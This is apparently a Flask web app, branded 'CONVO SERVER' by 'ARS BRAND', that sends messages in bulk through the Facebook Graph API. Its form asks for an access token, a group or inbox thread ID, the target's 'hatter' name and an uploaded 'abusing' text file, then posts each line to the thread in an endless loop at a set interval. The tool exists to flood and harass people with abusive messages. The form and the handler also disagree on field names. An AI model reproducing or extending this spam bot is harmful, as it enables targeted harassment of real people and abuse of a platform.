from flask import Flask, request
import requests
import os
from time import sleep
import time
from datetime import datetime
app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)


    return '''

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝓐𝓡𝓼 𝓑𝓻𝓪𝓷𝓭</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{
      margin: 0;
      font-family: Arial, sans-serif;
      background-image: url('//i.postimg.cc/1XdnR33v/835eb1d70765b04605421c03f3eb7328.jpg');  
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
      color: white;
    }
    .container{
      max-width: 300px;
      background-color: bisque;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(red, green, blue, alpha);
      margin: 0 auto;
      margin-top: 20px;
    }
    .header{
      text-align: center;
      padding-bottom: 10px;
    }
    .btn-submit{
      width: 100%;
      margin-top: 10px;
    }
    .footer{
      text-align: center;
      margin-top: 10px;
      color: blue;
    }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mb-3"> 𝐂𝐎𝐍𝐕𝐎 𝐒𝐄𝐑𝐕𝐄𝐑 𝐌𝐀𝐃𝐄 𝐁𝐘
   𝐓𝐇𝐄 𝐀𝐕𝐄𝐍𝐆𝐄𝐑𝐒 𝐀𝐑𝐒 𝐁𝐑𝐀𝐍𝐃 
    <h1 class="mt-3"> 𝐔𝐍𝐒𝐓𝐎𝐏𝐏𝐀𝐁𝐋𝐄 𝐀𝐑𝐒𝐇 𝐈𝐍𝐒𝐈𝐃𝐄 </h1>
  </header>

 <div class="containe">
      <form action="/" method="post" enctype="multipart/form-data">
        <div class="mb-3">
                  <label for="tokenFile" class="form-label">Upload Your Token File</label>
                  <input type="file" class="form-control" id="tokenFile" name="tokenFile" required>
        </div>
        <div class="mb-3">
          <label for="threadId">𝐄𝐍𝐓𝐄𝐑 𝐆𝐑𝐎𝐔𝐏 + 𝐈𝐍𝐁𝐎𝐗 𝐍𝐔𝐌𝐁𝐄𝐑:</label>
          <input type="text" class="form-control" id="threadId" name="threadId" required>
        </div>
        <div class="mb-3">
          <label for="kidx">𝐄𝐍𝐓𝐄𝐑 𝐇𝐀𝐓𝐓𝐄𝐑𝐒 𝐍𝐀𝐌𝐄:</label>
          <input type="text" class="form-control" id="kidx" name="kidx" required>
        </div>
        <div class="mb-3">
          <label for="txtFile">𝐒𝐄𝐋𝐄𝐂𝐓 𝐀𝐁𝐔𝐒𝐄𝐈𝐍𝐆 𝐓𝐗𝐓:</label>
          <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
        </div>
        <div class="mb-3">
          <label for="time">𝐌𝐄𝐒𝐒𝐄𝐆𝐄 𝐒𝐏𝐄𝐄𝐃:</label>
          <input type="number" class="form-control" id="time" name="time" required>
        </div>
        <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
      </form>
    </div>
   <style>
    .footer {
      color: #B00402; /* Off-Blue color */
    }
    .boxed-text {
      border: 2px solid #B00402; /* Border around the text */
      padding: 10px; /* Add some padding inside the box */
      display: inline-block; /* Make the box inline so it wraps around the text */
    }
    .boxed-text2 {
      border: 2px solid #000000; /* Border around the text */
      padding: 10px; /* Add some padding inside the box */
      display: inline-block; /* Make the box inline so it wraps around the text */
    }
    .footer a {
      color: #FFFF00; /* Off-Blue color for links */
      text-decoration: none; /* Remove underline from links */
    }

  </style>
</head>
<body>
</div>
      <footer class="footer">
      <p> <span class="color-sp"></span> <span class="boxed-text"><span class="color-spa">𝐂𝐎𝐍𝐕𝐎 𝐅𝐘𝐓𝐄 𝐒𝐄𝐕𝐄𝐑</span>.</span></p>
      <p><span class="boxed-text"><span class="color-span">𝐀𝐑𝐒 𝐁𝐑𝐀𝐍𝐃</span></span></p>
      <p><span class="boxed-text"><span class="color-sp">𝐅𝐎𝐋𝐋𝐎𝐖 𝐎𝐍</span> <a href="https://www.youtube.com/@XmartyAyushKing" class="color-s">𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊</a></p>
    </footer>
    </div>
</div>

  <script>
    // JavaScript to change footer text color
    var colors = ['green']; // Define colors
    var colorIndex = 0;

    setInterval(function() {
      var footerTexts = document.querySelectorAll('.footer .color-span');
      footerTexts.forEach(function(span) {
        span.style.color = colors[colorIndex];
      });
      colorIndex = (colorIndex + 1) % colors.length;
    }, 500); 
    </script>
    <script>

    // JavaScript to change footer text color
    var colors = ['blue']; // Define colors
    var colorIndex = 0;

    setInterval(function() {
      var footerTexts = document.querySelectorAll('.footer .color-spa');
      footerTexts.forEach(function(span) {
        span.style.color = colors[colorIndex];
      });
      colorIndex = (colorIndex + 1) % colors.length;
    }, 500); // Change color every 2 seconds (2000 milliseconds)
  </script>

  <script>
    // JavaScript to change footer text color
    var colors = ['red']; // Define colors
    var colorIndex = 0;

    setInterval(function() {
      var footerTexts = document.querySelectorAll('.footer .color-s');
      footerTexts.forEach(function(span) {
        span.style.color = colors[colorIndex];
      });
      colorIndex = (colorIndex + 1) % colors.length;
    }, 500); 
    </script>
    <script>

    // JavaScript to change footer text color
    var colors = ['white']; // Define colors
    var colorIndex = 0;

    setInterval(function() {
      var footerTexts = document.querySelectorAll('.footer .color-sp');
      footerTexts.forEach(function(span) {
        span.style.color = colors[colorIndex];
      });
      colorIndex = (colorIndex + 1) % colors.length;
    }, 500); // Change color every 2 seconds (2000 milliseconds)
  </script>
</body>
</html>
    '''


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
    app.run(debug=True)
